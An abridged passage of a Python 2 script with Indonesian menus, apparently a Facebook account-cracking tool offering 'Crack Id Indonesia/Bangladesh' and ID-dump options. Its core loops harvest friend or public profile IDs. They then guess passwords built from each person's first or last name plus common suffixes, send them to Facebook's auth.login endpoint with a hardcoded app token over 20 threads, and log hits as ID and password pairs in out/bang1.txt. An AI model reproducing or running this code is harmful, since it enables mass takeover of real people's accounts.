...
def menu():
	...
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print "\033[1;91m1.\033[1;97m Crack Id Indonesia "
	print "\033[1;91m2.\033[1;97m Crack Id Bangladesh "
	print "\033[1;91m3.\033[1;97m Crack Id Semua Negara (Membuat Password)"
	print "\033[1;91m4.\033[1;97m Dump Id "
	print "\033[1;91m5.\033[1;97m Profile Guard "
	print "\033[1;91m6.\033[1;97m Ikuti Saya Di Facebook "
	print "\033[1;91m0.\033[1;97m Logout            \n"
	pilih()
...
def bangla():
	...
	os.system('clear')
	print logo
	print " \033[1;94m<<< \033[1;97mCRACK BANGLADESH \033[1;94m>>> "
	print "\033[1;94m1. \033[1;97mCrack dari daftar teman"
	print "\033[1;94m2. \033[1;97mCrack dari id publik/teman"
	print "\033[1;94m3. \033[1;97mCrack dari file"
	print "\033[1;91m0. \033[1;97mKembali"
	pilih_bangla()
...
def pilih_bangla():
	...
	if peak =="":
		...
		print logo
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		idt = raw_input("\033[1;97m{\033[1;94m+\033[1;97m} ID publik/teman : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
...
#####MAIN_BANGLADESH#####
		...
		try:
			...
			if 'access_token' in y:
				...
				if 'www.facebook.com' in y['error_msg']:
					print '\033[1;94m[Cekpoint] ' + user + ' ❂ ' + pass1
					cek = open("out/bang1.txt", "a")
					cek.write("ID:" +user+ " Pw:" +pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = x['first_name']+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					y = json.load(data)
					if 'access_token' in y:
						print '\033[1;92m[Berhasil] ' + user + ' ❂ ' + pass2
						...
						if 'www.facebook.com' in y['error_msg']:
							print '\033[1;94m[Cekpoint] ' + user + ' ❂ ' + pass2
							cek = open("out/bang1.txt", "a")
							cek.write("ID:" +user+ " Pw:" +pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = x['first_name']+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							y = json.load(data)
							if 'access_token' in y:
								print '\033[1;92m[Berhasil] ' + user + ' ❂ ' + pass3
								...
								if 'www.facebook.com' in y['error_msg']:
									print '\033[1;94m[Cekpoint] ' + user + ' ❂ ' + pass3
									cek = open("out/bang1.txt", "a")
									cek.write("ID:" +user+ " Pw:" +pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
									...
									if 'access_token' in y:
										...
										if 'www.facebook.com' in y['error_msg']:
											print '\033[1;94m[Cekpoint] ' + user + ' ❂ ' + pass4
											cek = open("out/bang1.txt", "a")
											cek.write("ID:" +user+ " Pw:" +pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = x['first_name']+'786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											y = json.load(data)
											if 'access_token' in y:
												print '\033[1;92m[Berhasil] ' + user + ' ❂ ' + pass5
												...
												if 'www.facebook.com' in y['error_msg']:
													print '\033[1;94m[Cekpoint] ' + user + ' ❂ ' + pass5
													cek = open("out/bang1.txt", "a")
													cek.write("ID:" +user+ " Pw:" +pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = x['last_name']+'123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													y = json.load(data)
													if 'access_token' in y:
														print '\033[1;92m[Berhasil] ' + user + ' ❂ ' + pass6
														...
														if 'www.facebook.com' in y['error_msg']:
															print '\033[1;94m[Cekpoint] ' + user + ' ❂ ' + pass6
															cek = open("out/bang1.txt", "a")
															cek.write("ID:" +user+ " Pw:" +pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = x['last_name']+'1234'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															y = json.load(data)
															if 'access_token' in y:
																print '\033[1;92m[Berhasil] ' + user + ' ❂ ' + pass7
																...
																if 'www.facebook.com' in y['error_msg']:
																	print '\033[1;94m[Cekpoint] ' + user + ' ❂ ' + pass7
																	cek = open("out/bang1.txt", "a")
																	cek.write("ID:" +user+ " Pw:" +pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	...
																	if 'access_token' in y:
																		...
																		if 'www.facebook.com' in y['error_msg']:
																			print '\033[1;94m[Cekpoint] ' + user + ' ❂ ' + pass8
																			cek = open("out/bang1.txt", "a")
																			cek.write("ID:" +user+ " Pw:" +pass8+"\n")
																			cek.close()
																			cekpoint.append(user+pass8)
	...
	p = ThreadPool(20)
	p.map(main, id)
	print '\n\033[1;97m[\033[1;94m✓\033[1;97m] \033[1;97mSelesai ....'
	print"\033[1;97m[\033[1;92m+\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;94mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;94m"+str(len(cekpoint))
	print("\033[1;97m[\033[1;94m!\033[1;97m] \033[1;97mCP File tersimpan : out/bang1.txt")
...
def sandi():
	...
	os.system('clear')
	print logo
	print "\033[1;96m1. \033[1;97mCrack dari daftar teman"
	print "\033[1;96m2. \033[1;97mCrack dari id publik/teman"
	print "\033[1;96m3. \033[1;97mCrack dari file"
	print "\033[1;91m0. \033[1;97mKembali"
	pilih_sandi()
...
def pilih_sandi():
	...
	if peak =="":
		...
		print logo
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		print "\033[1;93m       < <  BUAT LIST PASSWORD  > >"
...
#####CRACK SANDI#####
	...
	p = ThreadPool(20)
	p.map(main, id)
	print '\n\033[1;97m[\033[1;96m✓\033[1;97m] \033[1;97mSelesai ....'
	print"\033[1;97m[\033[1;91m+\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;91mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;91m"+str(len(cekpoint))
...
def dump():
	...
	os.system('clear')
	print logo
	print "\033[1;95m1.\033[1;97m Dump ID dari daftar teman "
	print "\033[1;95m2.\033[1;97m Dump ID dari publik/teman "
...
def id_teman():
	...
	try:
		...
		for a in z['data']:
			idteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"),;sys.stdout.flush();time.sleep(0.0050)
		...
		print('\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m File anda tidak tersimpan !')
		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		os.system("python2 vip.py")
	except requests.exceptions.ConnectionError:
...
def idfrom_teman():
	...
	try:
		...
		print"\033[1;91m[!] File Tidak Tersimpan "
...
def guard():
	...
	g = raw_input("\033[1;93m︻デ═一▸ \033[91m:\033[1;92m ")
	if g == "1":
		aktif = "true"
		gaz(toket, aktif)
	elif g == "2":
